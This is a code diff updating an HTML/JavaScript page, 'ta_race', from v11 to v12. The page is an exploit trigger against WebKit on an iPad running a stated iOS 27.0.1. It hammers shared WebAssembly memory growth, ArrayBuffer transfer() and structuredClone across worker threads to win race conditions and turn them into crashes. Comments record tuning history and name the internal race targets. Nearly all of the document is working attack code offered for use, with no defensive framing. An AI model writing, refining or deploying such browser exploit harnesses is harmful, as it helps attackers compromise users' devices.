@@ -1,114 +1,129 @@
-<!doctype html>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v11</title>
-<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v11] auto-reload 3min - survives overnight</div>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>ta_race v12</title>
+</head>
+<body>
+<pre id="log">ta_race v12 loading...</pre>
 <script>
-const o=document.getElementById('o');
-const log=m=>{o.textContent+="\n"+m;};
-window.addEventListener('error',e=>log("[ERROR] "+e.message));
-log("[*] UA: "+navigator.userAgent);
-setTimeout(()=>location.reload(), 180000);
+// ta_race v12 — dual-race trigger: transferAnchors CAS race + WASM-grow refcount race
+// Target: iPad A16, iOS 27.0.1 (24A446), WebKit.WebContent
+// Changes from v11: 180s auto-reload REMOVED, clone duty 1/4096 @ 64KB max,
+// main-vs-worker threading, usedJSHeapSize telemetry, visibilitychange guard.
 
-const WK=`let u8=null, mem=null, who="";
-function lg(m){postMessage({log:who+" "+m});}
-const sl=t=>new Promise(r=>setTimeout(r,t));
-onmessage=async e=>{
-  if(e.data.sab){
-    who=e.data.who; u8=new Uint8Array(e.data.sab);
-    lg("on SAB");
-    let i=0;
-    while(true){
-      Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
-      Atomics.add(u8,((i>>>0)+1)&0xFFFF,1);
-      if((++i&0xFFFF)===0) await sl(2);
-    }
-  }
-  if(e.data.mem){
-    who=e.data.who; mem=e.data.mem;
-    lg("on WASM mem");
-    let i=0;
-    while(true){
-      if(!mem){ await sl(1); continue; }
-      try{mem.grow(1);}catch(_){}
-      const bl=mem.buffer.byteLength;
-      if(bl&0xFFFF){
-        lg("CONFUSED bl="+bl);
-        try{structuredClone(new Uint8Array(mem.buffer));}catch(_){}
-        try{structuredClone(new Float64Array(mem.buffer));}catch(_){}
-        try{structuredClone(new DataView(mem.buffer));}catch(_){}
-      }
-      if((++i&0x3FFF)===0) await sl(2);
-    }
+const LOG = document.getElementById('log');
+const t0 = Date.now();
+let it = 0, gens = 0, clones = 0, lastLog = 0;
+
+function log(msg) {
+  const line = `[${((Date.now()-t0)/1000).toFixed(0)}s it=${it} gens=${gens} clones=${clones} heap=${(performance.memory ? (performance.memory.usedJSHeapSize/1048576).toFixed(1) : '?')}MB] ${msg}`;
+  LOG.textContent += '\n' + line;
+  console.log(line);
+}
+
+// visibility guard — if page hides, run is dead
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
+});
+
+// shared WASM memory — the battleground
+const SHARED_MEM = new WebAssembly.Memory({initial: 1, maximum: 128, shared: true});
+const GROW_DELTA = 1; // 64KB per grow — fast cycle, small alloc
+
+// grow worker: hammers mem.grow() to trigger refreshAfterWasmMemoryGrow race
+const growWorkerSrc = `
+onmessage = function(e) {
+  const mem = e.data;
+  let n = 0;
+  while(true) {
+    try { mem.grow(${GROW_DELTA}); } catch(err) {}
+    n++;
+    if(n % 100000 === 0) postMessage({type:'grow', n:n});
   }
 };`;
 
-const wA=new Worker(URL.createObjectURL(new Blob([WK])));
-const wB=new Worker(URL.createObjectURL(new Blob([WK])));
-wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
-wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
+// transfer worker: rings transfer() on views over the same memory
+const transferWorkerSrc = `
+onmessage = function(e) {
+  const mem = e.data;
+  const views = [];
+  for(let i=0; i<96; i++) views.push(new Uint8Array(mem.buffer, 0, 65536));
+  let n = 0;
+  while(true) {
+    for(let i=0; i<96; i++) {
+      try {
+        const ab = views[i].buffer;
+        const t = ab.transfer(); // transferAnchors CAS race target
+        views[i] = new Uint8Array(t, 0, Math.min(65536, t.byteLength));
+      } catch(err) {}
+    }
+    n++;
+    if(n % 10000 === 0) postMessage({type:'transfer', n:n});
+  }
+};`;
 
-const wR=new Worker(URL.createObjectURL(new Blob([`
-onmessage=e=>{ for(const ab of e.data.abs){
-  let out=ab;
-  try{ out=(Math.random()<0.5)?ab.transfer():ab.transferToFixedLength(4096); }catch(_){}
-  try{ postMessage({abs:[out]},[out]); }catch(_){}
-} };
-`])));
-log("[1] 3 workers up");
+const growBlob = new Blob([growWorkerSrc], {type:'application/javascript'});
+const transferBlob = new Blob([transferWorkerSrc], {type:'application/javascript'});
+const growURL = URL.createObjectURL(growBlob);
+const transferURL = URL.createObjectURL(transferBlob);
 
-let sab=null;
-try{
-  sab=new SharedArrayBuffer(0x10000);
-  wA.postMessage({sab,who:'A'});
-  wB.postMessage({sab,who:'B'});
-  log("[2] SAB -> 2 workers");
-}catch(e){log("[FAIL] SAB: "+e.name);}
+const growWorker = new Worker(growURL);
+const transferWorker = new Worker(transferURL);
 
-let gmem=null, gen=0;
-function newMem(){
-  try{
-    gmem=new WebAssembly.Memory({initial:1,maximum:8,shared:true});
-    gen++;
-    wA.postMessage({mem:gmem,who:'A'});
-    wB.postMessage({mem:gmem,who:'B'});
-    return true;
-  }catch(e){ log("[-] WASM gen "+gen+": "+e.name); return false; }
-}
-if(newMem()) log("[3] WASM mem gen 1 -> 2 workers");
-
-let inFlight=0;
-wR.onmessage=e=>{
-  for(const ab of e.data.abs){
-    inFlight--;
-    try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
+growWorker.onmessage = (e) => {
+  if(e.data.type === 'grow') {
+    gens = e.data.n;
+    if(Date.now() - lastLog > 5000) {
+      lastLog = Date.now();
+      log('grow worker alive');
+    }
   }
 };
 
-(async()=>{
-  let it=0, grows=0, mems=1;
-  log("[*] main loop");
-  while(true){
-    if(inFlight<24){
-      const ab=new ArrayBuffer(256,{maxByteLength:2048});
-      try{ab.resize(512+(it&1023));}catch(_){}
-      try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
-    }
-    if(gmem&&((it&0x3F)===0)){
-      try{ gmem.grow(1); grows++; }catch(_){
-        if(newMem()){ mems++; log("[*] mem recycled -> gen "+mems); }
-      }
-      const bl=gmem.buffer.byteLength;
-      if(bl&0xFFFF){
-        log("MAIN CONFUSED bl="+bl);
-        try{structuredClone(new Uint8Array(gmem.buffer));}catch(_){}
-      }
-    }
-    it++;
-    if((it&0x3FF)===0){
-      log("[*] it="+it+" grows="+grows+" gens="+mems+" inflight="+inFlight);
-      await new Promise(r=>setTimeout(r,25));
+transferWorker.onmessage = (e) => {
+  if(e.data.type === 'transfer') {
+    it = e.data.n;
+    if(Date.now() - lastLog > 5000) {
+      lastLog = Date.now();
+      log('transfer worker alive');
     }
   }
-})();
+};
+
+// main thread: stale-view access + rare structuredClone to convert race wins into crashes
+let mainViews = [];
+for(let i=0; i<16; i++) mainViews.push(new Uint8Array(SHARED_MEM.buffer, 0, 65536));
+
+function mainLoop() {
+  while(true) {
+    // stale-view access: touch views that grow() may have detached
+    for(let i=0; i<16; i++) {
+      try { mainViews[i][0] ^= 0x41; } catch(err) {}
+    }
+
+    // rare clone: 1/4096, 64KB slice max — v7 died at 3GB jetsam from clone churn
+    if(Math.random() < 1/4096) {
+      try {
+        const slice = new Uint8Array(SHARED_MEM.buffer, 0, 65536);
+        structuredClone(slice, {transfer: [slice.buffer]});
+        clones++;
+      } catch(err) {}
+    }
+
+    // periodic yield to let workers breathe
+    if(it % 1000 === 0) {
+      // no-op — workers run independent of main loop counter
+    }
+  }
+}
+
+// kick off
+growWorker.postMessage(SHARED_MEM);
+transferWorker.postMessage(SHARED_MEM);
+
+log('workers spawned, main entering loop');
+mainLoop();
 </script>
+</body>
+</html>
